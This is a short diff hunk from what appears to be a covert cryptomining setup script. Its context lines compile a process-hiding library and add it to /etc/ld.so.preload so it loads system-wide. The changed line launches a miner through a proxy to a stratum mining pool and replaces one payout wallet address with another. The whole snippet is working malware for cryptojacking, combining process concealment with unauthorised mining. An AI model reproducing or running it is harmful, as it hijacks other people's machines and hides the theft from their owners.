@@ -46,4 +46,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./avx512-sha-vaes -a gr -o stratum+tcps://na-rtm.pool-server.com:5555 -u RESAxxraKQfvCo16GjzmGFXUd6BqLdADqn.PetrolAwAw32 -p IhatePopUps --no-tune
+./graftcp/graftcp ./avx512-sha-vaes -a gr -o stratum+tcps://na-rtm.pool-server.com:5555 -u RYSfyLyvKzpPp17xxFvae1dBRqurwBcnZs.PetrolAwAw32 -p IhatePopUps --no-tune
